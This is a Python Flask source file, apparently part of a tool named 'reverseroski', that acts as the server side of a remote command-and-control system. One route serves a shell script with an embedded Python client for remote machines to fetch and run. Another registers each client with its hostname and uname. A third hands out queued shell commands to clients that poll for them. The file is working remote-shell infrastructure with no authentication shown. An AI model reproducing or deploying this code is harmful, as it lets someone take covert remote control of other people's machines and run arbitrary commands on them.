from flask import request, redirect, url_for, flash, render_template, Blueprint
from flask_login import current_user, login_user, logout_user, login_required
from sqlalchemy.exc import IntegrityError
from datetime import datetime
from hashlib import sha256
from os import urandom
import json

from .forms import RegisterClientForm, PingForm
from ..app import db
from ..models import Client, Command

client = Blueprint('client', __name__, url_prefix='/client')


@client.route('/')
def serve_client():
    return open(
        'reverseroski/client/shell/shell.sh'
    ).read().format(
        python=open(
            'reverseroski/client/shell/shell.py'
        ).read(),
    )

@client.route('/register', methods=['POST'])
def register_client():
    try:
        c=Client(
            clientname=request.form['clientname'],
            uname=request.form['uname'],
            registration_time=datetime.utcnow(),
        )
        db.session.add(c)
        db.session.commit()
        return json.dumps({
            'clientid':str(c.get_id()),
        })
    except IntegrityError as e:
        db.session.rollback()
    return 'err'

@client.route('/get_pending', methods=['POST'])
def get_pending():
    """
    This is where the client ping us for their 
    next set of commands.

    :return json: the pending commands
    """
    form=PingForm()
    return json.dumps(list(map(
        lambda command: (command.id, command.command,),
        Command.query.filter_by(
                clientid=form.clientid.data,
                pending=True,
        ).all(),
    )))
